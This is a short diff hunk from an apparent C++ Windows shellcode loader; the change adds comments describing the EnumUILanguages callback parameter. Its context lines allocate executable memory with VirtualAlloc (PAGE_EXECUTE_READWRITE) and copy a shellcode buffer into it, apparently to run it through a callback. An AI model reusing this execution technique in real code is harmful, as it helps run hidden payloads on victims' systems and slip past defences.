@@ -52,6 +52,9 @@ int main() {
         //    [in] LONG_PTR             lParam
         //    );
         
+        // [in] lpUILanguageEnumProc
+        // Pointer to an application - defined EnumUILanguagesProc callback function.EnumUILanguages calls this function repeatedly to enumerate the languages in the list.
+
         
         LPVOID address = ::VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
         memcpy(address, &shellcode[0], sizeof(shellcode));
